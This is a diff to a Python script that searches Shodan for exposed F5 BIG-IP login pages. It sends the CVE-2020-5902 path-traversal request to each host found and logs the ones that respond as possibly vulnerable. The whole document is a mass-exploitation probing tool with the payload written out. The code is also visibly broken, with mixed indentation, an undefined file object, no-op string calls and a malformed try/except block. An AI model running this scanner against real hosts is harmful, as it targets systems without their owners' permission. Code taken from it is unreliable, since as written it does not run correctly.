@@ -7,6 +7,7 @@
 # Author: cbk914
 
 import shodan
+import nmap
 import json
 import requests
 import sys
@@ -16,8 +17,15 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 # Configuration
 API_KEY = "YOURAPIKEY"
 SEARCH_FOR = 'http.title:"BIG-IP&reg;- Redirect"'
-
+PAYLOAD = "/tmui/login.jsp/..;/tmui..." # CVE-2020-5902
+CVE = "CVE-2020-5902"
 session = requests.Session()
+
+def filter_result(str):
+    str.strip() #trim
+	str.lstrip() #ltrim
+	str.rstrip() #rtrim
+	return str
 
 def login (IP,PORT,CC):
 	try:
@@ -26,15 +34,15 @@ def login (IP,PORT,CC):
 		else:
 			http_type = "http"
 		rawBody = "`{""}`"
-		headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0","Referer":"https://"+IP+":"+PORT+"/login","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json;charset=utf-8"}
-		response = session.post(""+http_type+"://"+IP+":"+PORT+"/tmui/login.jsp/..;/tmui...", data=rawBody, headers=headers, verify=False)
+		headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0","Referer":"https://"+IP+":"+PORT+""+PAYLOAD+"","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json;charset=utf-8"}
+		response = session.post(""+http_type+"://"+IP+":"+PORT+""+PAYLOAD+"", data=rawBody, headers=headers, verify=False)
 		if response.status_code == 200:
-			print ("[*]Found F5 device potentially vulnerable to CVE-2020-5902 ... Logging to file.[*]")
+			print ("[*]Found F5 device potentially vulnerable to "+CVE+" ... Logging to file.[*]")
 	    	text_file.open("/tmp/f5.log")
-            text_file.write(""+http_type+"://"+IP+":"+PORT+"/tmui/login.jsp/..;/tmui...\n")
+            text_file.write(""+http_type+"://"+IP+":"+PORT+""+PAYLOAD+"\n")
 			text_file.close()
 		else:
-			print ("[*]Not Reachable[*]")
+			print ("[*]Unreachable[*]")
 	except Exception as e:
 		print('Error: %s' % e)
 
@@ -56,8 +64,10 @@ try:
 				PORT = str(service['port'])
                 CC = service['location']['country_name']
 				login (IP,PORT,CC)
-
-				
+except KeyboardInterrupt:
+		print ("Ctrl-c pressed ...")
+		sys.exit(1)
+								
 except Exception as e:
 		print('Error: %s' % e)
 		sys.exit(1)
